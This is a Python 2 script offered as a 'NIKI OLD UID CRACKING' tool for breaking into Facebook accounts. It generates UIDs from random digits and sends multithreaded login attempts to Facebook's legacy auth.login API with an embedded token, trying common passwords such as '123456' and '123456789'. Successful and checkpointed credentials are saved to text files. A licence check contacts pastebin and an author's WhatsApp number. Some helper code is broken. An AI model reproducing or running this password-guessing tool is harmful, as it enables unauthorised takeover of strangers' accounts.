import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests
logo2 = '\n\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$\n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        \n\x1b[0;35m \n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY Mr. NIKI\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m Mr. NIKI  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+8801645137393 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mNIKI.CYBER404.OFFICIALS (NIKI) \n\x1b[1;91m-----------------------------------------------'

def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Wait A Few Moments \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def jenw():
    os.system('rm -rf .txt')
    os.system('clear')
    print logo2
    print
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Set Phone Number Amount You Want To Clone\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Example\x1b[1;93m : 2000,5000,10000,20000\n'
    niki = input('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Enter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    tik()
    for n in range(niki):
        nmbr = random.randint(1111, 9999)
        sys.stdout = open('.txt', 'a')
        print nmbr

    sys.stdout.flush()


logo3 = '\n\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$\n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        \n\x1b[0;35m \n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY Mr. NIKI\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m Mr. NIKI  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+8801645137393 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mNIKI.CYBER404.OFFICIALS (NIKI) \n\x1b[1;91m-----------------------------------------------'

def reg():
    os.system('clear')
    print logo3
    print ''
    print '\x1b[1;31;1m  Access For This Tools Get Approval First '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/Download/.restor.jt', 'r').read()
    except (KeyError, IOError):
        reg2()
    try:
        r = requests.get('https://pastebin.com/raw/PaFKrtNi').text
    except requests.exceptions.ConnectionError:
        print "No Internet Connection"
        exit()
    if to in r:
        jenw()
    else:
        os.system('clear')
        print logo3
        print '\tApproved Failed'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Your ID Is Not Approved '
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Copy The ID And Send To Admin'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Your ID\x1b[1;93m : \x1b[1;92m' + to
        raw_input('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Press enter to send id')
        os.system('am start https://wa.me/+8801645137393?text=Please%20Give%20Me%20Approve%20Sir:%20' + to)
        reg()


def reg2():
    os.system('clear')
    print logo3
    print '\tApproval Not Detected'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Copy Your ID And Press Enter'
    id = uuid.uuid4().hex[:50]
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Your ID \x1b[1;93m: \x1b[1;92m' + id
    print ''
    raw_input('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Press Enter To Go To WhatsApp')
    os.system('am start https://wa.me/+8801645137393?text=Please%20Give%20Me%20Approve%20Sir:%20' + id )
    sav = open('/sdcard/Download/.restor.jt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Press enter to check Approval ')
    reg()

reg()

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1) 
    os.system('Then type: python2 clone.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Start Cloning \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
logo1 = '\n\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$\n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        '


def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    os.system('xdg-open  https://youtube.com/channel/UCsH0yB-x6fKeu8uQ-uDhTzw')
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m NIKI OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACKING'
    time.sleep(0.05)
    print '\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m BACK\x1b[1;92m'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE\x1b[1;93m : \x1b[1;91m')
    if peak == '':
        print '\x1b[1;92mFill In Correctly'
        pilih_login()
    elif peak == '1':
        Zeek()


def Zeek():
    os.system('clear')
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m NIKI OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK OLD ID \x1b[1;91m[\x1b[1;93m2004-2005\x1b[1;91m]'
    time.sleep(0.05)
    print '\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m BACK'
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE\x1b[1;93m : \x1b[1;91m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo1
        print 47 * '\x1b[1;91m-'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m FACEBOOK UID ACCOUNT CLONER'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;96m TYPE ANY DIGIT UID CODE'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m EXAMPLE \x1b[1;93m: \x1b[1;91m00,01,02,03,04,05,06,07,08'
        try:
            c = raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE\x1b[1;93m  : \x1b[1;91m')
            print
            os.system("clear")
            print logo1
            print 47 * '\x1b[1;91m-'
            print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m NIKI OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
            k = '2'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            exit()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;91m-'
    xxx = str(len(id))
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL UID NUMBER \x1b[1;93m: \x1b[1;91m' + xxx)
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m UID YOU CHOOSE   \x1b[1;93m: \x1b[1;91m' + c)
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m START UID ACCOUNT CRACKING...')
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m STOP THIS PROSSES CTRL+Z')
    print 47 * '\x1b[1;91m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mNIKI-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('nikiok.txt', 'a')
                okb.write(k + c + user + " | " + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mNIKI-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                cps = open('nikicp.txt', 'a')
                cps.write(k + c + user + " | " + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234567'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mNIKI-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('nikiok.txt', 'a')
                    okb.write(k + c + user + " | " + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mNIKI-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('nikicp.txt', 'a')
                    cps.write(k + c + user + " | " + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '12345678'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mNIKI-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('nikiok.txt', 'a')
                        okb.write(k + c + user + " | " + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mNIKI-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('nikicp.txt', 'a')
                        cps.write(k + c + user + " | " + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456789'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m [\x1b[1;92mNIKI-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass4
                            okb = open('nikiok.txt', 'a')
                            okb.write(k + c + user + " | " + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [\x1b[1;91mNIKI-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass4
                            cps = open('nikicp.txt', 'a')
                            cps.write(k + c + user + " | " + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Process Has Been Completed'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Total \x1b[1;92mNIKI-OK/\x1b[1;91mNIKI-CP \x1b[1;93m: ' + str(len(oks)) + '/' + str(len(cpb))
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Cloned Accounts Has Been Saved\x1b[1;93m :\x1b[1;92m niki.txt'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Thanks For Using NIKI Tool'
    raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Back')
    exit()

login()
